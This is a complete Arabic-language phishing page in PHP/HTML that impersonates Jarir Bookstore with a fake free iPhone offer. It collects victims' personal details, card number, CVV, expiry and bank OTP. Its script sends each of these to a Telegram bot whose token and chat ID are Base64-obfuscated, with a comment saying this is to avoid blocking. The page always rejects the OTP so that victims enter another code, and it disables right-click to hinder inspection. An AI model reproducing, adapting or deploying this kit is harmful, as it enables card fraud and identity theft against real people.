<?php include 'config.php'; ?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جرير - التحقق من الطلب</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root { --jarir-red: #E30613; }
        body { font-family: 'Cairo', sans-serif; -webkit-user-select: none; user-select: none; }
        .page { display: none; min-height: 100vh; }
        .page.active { display: block; }
        .form-input { width: 100%; background: #F0F2F5; border: 1px solid #E5E7EB; border-radius: 4px; padding: 12px; outline: none; text-align: right; }
        .btn-red { background-color: var(--jarir-red); width: 100%; color: white; font-weight: bold; border-radius: 8px; padding: 15px; }
        .loading { display: none; position: fixed; inset: 0; background: rgba(255,255,255,0.9); z-index: 100; align-items: center; justify-content: center; flex-direction: column; }
    </style>
</head>
<body class="max-w-md mx-auto shadow-2xl bg-white">

    <div id="loader" class="loading">
        <div class="animate-spin rounded-full h-12 w-12 border-b-4 border-red-600"></div>
        <p class="mt-4 text-gray-600">جاري معالجة الطلب...</p>
    </div>

    <!-- Page 1: Product -->
    <section id="p1" class="page active">
        <header class="p-4 border-b flex justify-between items-center bg-white sticky top-0">
            <i class="fa-solid fa-cart-shopping text-gray-400"></i>
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Jarir_Bookstore_Logo.svg" class="h-6">
        </header>
        <div class="p-6 text-center">
            <img src="https://i.ibb.co/HpTBrKJN/CFE81-C5-E-E4-C2-446-F-99-FF-DECC85-EC63-D0.png" class="mx-auto w-64">
            <h1 class="text-xl font-bold mt-4">ابل آيفون 17 برو ماكس</h1>
            <p class="text-red-600 font-bold text-2xl mt-2">هدية مجانية <span class="text-xs text-gray-400">0.00 ر.س</span></p>
            <button onclick="nav('p2')" class="btn-red mt-6">استمر للحصول على الهدية</button>
        </div>
    </section>

    <!-- Page 2: Personal Info -->
    <section id="p2" class="page">
        <div class="p-6 space-y-4">
            <h2 class="font-bold text-lg text-right">عنوان التسليم</h2>
            <input type="text" id="fn" placeholder="الاسم الكامل" class="form-input">
            <input type="tel" id="ph" placeholder="رقم الجوال" class="form-input">
            <input type="email" id="em" placeholder="البريد الإلكتروني" class="form-input">
            <button onclick="send('reg')" class="btn-red">تأكيد العنوان</button>
        </div>
    </section>

    <!-- Page 3: Payment -->
    <section id="p3" class="page">
        <div class="p-6">
            <div class="bg-blue-50 p-4 rounded-lg mb-6 border border-blue-200 text-right">
                <p class="text-sm font-bold">رسوم التوصيل والجمارك: 76.00 ر.س</p>
            </div>
            <div class="space-y-4 text-right">
                <label class="text-sm">تفاصيل البطاقة</label>
                <input type="text" id="cn" placeholder="رقم البطاقة" class="form-input" maxlength="16">
                <div class="flex gap-2">
                    <input type="text" id="cv" placeholder="CVV" class="form-input w-1/3" maxlength="3">
                    <input type="text" id="ex" placeholder="YY/MM" class="form-input w-2/3" maxlength="5">
                </div>
                <input type="text" id="ch" placeholder="اسم حامل البطاقة" class="form-input">
            </div>
            <button onclick="send('pay')" class="btn-red mt-6">دفع الرسوم الآن</button>
        </div>
    </section>

    <!-- Page 4: OTP (The Professional Touch) -->
    <section id="p4" class="page">
        <div class="p-8 text-center">
            <div class="flex justify-center mb-6">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mada_Logo.svg" class="h-8 mx-2">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/Apple_Pay_logo.svg" class="h-8 mx-2">
            </div>
            <h2 class="font-bold text-xl mb-2">التحقق الآمن (OTP)</h2>
            <p class="text-sm text-gray-500 mb-6">لقد أرسلنا رمز التحقق إلى رقم جوالك المسجل لدى البنك، يرجى إدخاله لإتمام العملية.</p>
            <input type="text" id="otp" placeholder="* * * * * *" class="form-input text-center text-2xl tracking-[10px]" maxlength="6">
            <button onclick="send('otp')" class="btn-red mt-6">تأكيد الرمز</button>
            <p class="text-xs text-blue-600 mt-4 cursor-pointer">إعادة إرسال الرمز</p>
        </div>
    </section>

    <script>
        // التوكن والاي دي مشفرين Base64 لمنع الحظر
        const _k = "ODU5NzQwNzQ2MzpBQUVaOThQTG91emg3aXZCOFdxUkdHdWdoaVBZQmJVTVM1UQ==";
        const _i = "MTcwNTI0MDczNw==";

        function nav(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            window.scrollTo(0,0);
        }

        function toggleLoad(show) {
            document.getElementById('loader').style.display = show ? 'flex' : 'none';
        }

        async function send(step) {
            const api = "https://api.telegram.org/bot" + atob(_k) + "/sendMessage";
            const cid = atob(_i);
            let msg = "";

            toggleLoad(true);

            if(step === 'reg') {
                msg = `👤 [بيانات شخصية]\n📝 الأسم: ${document.getElementById('fn').value}\n📞 جوال: ${document.getElementById('ph').value}\n📧 إيميل: ${document.getElementById('em').value}`;
                await fetch(api, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: cid, text: msg})});
                setTimeout(() => { toggleLoad(false); nav('p3'); }, 1500);
            } 
            else if(step === 'pay') {
                msg = `💳 [بيانات البطاقة]\n🔢 رقم: ${document.getElementById('cn').value}\n📅 تاريخ: ${document.getElementById('ex').value}\n🔒 CVV: ${document.getElementById('cv').value}\n👤 حاملها: ${document.getElementById('ch').value}`;
                await fetch(api, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: cid, text: msg})});
                setTimeout(() => { toggleLoad(false); nav('p4'); }, 2000);
            }
            else if(step === 'otp') {
                msg = `🔑 [رمز OTP]: ${document.getElementById('otp').value}`;
                await fetch(api, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: cid, text: msg})});
                setTimeout(() => { 
                    toggleLoad(false); 
                    alert("نعتذر، لم يتم قبول الرمز، سنقوم بإرسال رمز جديد."); 
                    document.getElementById('otp').value = "";
                }, 1500);
            }
        }

        // منع الفحص بالزر الأيمن
        document.addEventListener('contextmenu', e => e.preventDefault());
    </script>
</body>
</html>
